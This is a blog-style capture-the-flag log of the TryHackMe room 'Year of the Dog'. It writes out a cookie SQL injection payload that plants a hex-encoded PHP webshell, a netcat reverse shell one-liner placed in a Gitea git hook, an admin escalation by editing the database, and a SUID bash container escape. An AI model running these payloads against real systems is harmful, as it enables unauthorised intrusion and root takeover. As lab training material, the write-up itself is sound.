---
layout: post
title: CTF Log - Year of the Dog (THM)
description: A log of how I did the TryHackMe room Year of the Dog by Muirland Oracle
summary: A log of the THM room "Year of the Dog"
tags: ctf log
minute: 5
---
<br/>

> {{ page.description }}

<br/>

# Year of the Dog
## Request Header SQLi
A portscan reveals the only ports: 22, 80. 

The web server seems to have practically no content. The only thing I fuzzed that returned an interesting result was the `id` cookie parameter. Adding a `'` to it causes the website to error out, so it seems like some sort of injection is afoot.

The payload `' union select 1, @@version#` confirms that the cookie `id` parameter is vulnerable to SQL injection. 

I'm able to get a webshell on the server using `' into outfile '/var/www/html/wshell.php' fields terminated by 0x3c3f70687020706173737468727528245f4745545b2263225d293b203f3e#`

A breakdown of that payload:

- `into outfile` - MySQL syntax to place the selected object into a file
- `fields terminated by` - Allows you to choose what data to append to each field in the new file
- `3c3f70687020706173737468727528245f4745545b2263225d293b203f3e` a hex encoded PHP webshell: `<?php passthru($_GET["c"]); ?>`. The `0x` tells MySQL that the following data is hex and should be treated as such. This was done to bypass a web filter that flagged the characters `<>` as malicious.

Using that webshell, I'm able to execute a reverse shell and get a session on the machine as the user `www-data`. 

## Readable Authentication Log
To escalate to the user `dylan`, I found a file named `work_analysis` in that user's home directory. 

The file seemed to be a copy of a locally hosted web application's authentication logs. I grepped for `dylan` in that file and found an entry where the user had accidentally typed their password in the username field. 

Using this password, I'm able to get an SSH session as `dylan`. 

## Database Overwrite & Malicious Git Hook
A check on the active ports showed a Gitea server being served on `127.0.0.1:3000`. I used SSH with the port-forwarding parameter `-L 8090:127.0.0.1:3000` to send connections against my local machine's port `8090` to the address `127.0.0.1:3000` through the SSH connection. 

With this, I'm able to browse the Gitea website. I create a user `test`. 

I use `scp` as `dylan` to download the `Gitea.db` database file. Using `sqlite` I'm able to view the database and make edits to it. I find the user table and notice the `is_admin` parameter and edit that column to make my user an admin.

```
sqlite> select email, is_admin from user;
dylan@yearofthedog.thm|1
test@gmail.com|0

sqlite> update user set is_admin = 1 where email = 'test@gmail.com';
```

Refreshing the page now shows that my user `test` is an admin. 

With admin privileges I'm now able to use the githooks functionality. I create a repo and append this reverse shell code: `mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f` to one of the template scripts in the repo's githooks section. 

It took some trial and error to arrive at that reverse shell. The version of that shell available on PentestMonkey didn't function. Fortunately, a verbose stack trace was displayed in the terminal when the script failed, allowing me to refine the one-liner. 

![[error.png]]

I also did some online research on different types of bash/sh reverse shells.

## Abusing Container Privileges
Naturally, the reverse shell from the githook places me in a container. 

I'm easily able to get root access since `sudo` is available for all commands; I just `sudo -s`. 

Reading through the Gitea documentation and the `app.ini` file for the web server, the `/data` directory within the container maps to a directory on the host machine. 

I navigate to `/bin` with my session as `dylan` and use `python3 -m http.server` to host a web server on port `8000`. 

Within the container, I use `ip a` to see that the container is communicating through the virtual IP of `172.17.0.2`. The gateway address in this subnet would naturally route to the host machine, so I do `wget 172.17.0.1:8000/bash -O /data/bash` to download a copy of the bash binary. 

With `chmod +sx /data/bash` I make the binary executable by anyone and give it the SUID bit. Since I've downloaded it as `root` within the container, the SUID bit will make the binary run as `root`. 

With my session as `dylan` I do `./bash -p` to get a shell as `root`. Here is an explanation of what `-p` is for, taken from the bash man pages:

```
If the shell is started with the effective user (group) id not equal to the real user (group) id, and the **-p**option is not supplied, no startup files are read, shell functions are not inherited from the environment, the **SHELLOPTS**, **BASHOPTS**, **CDPATH**, and **GLOBIGNORE** variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id. If the **-p** option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.
```
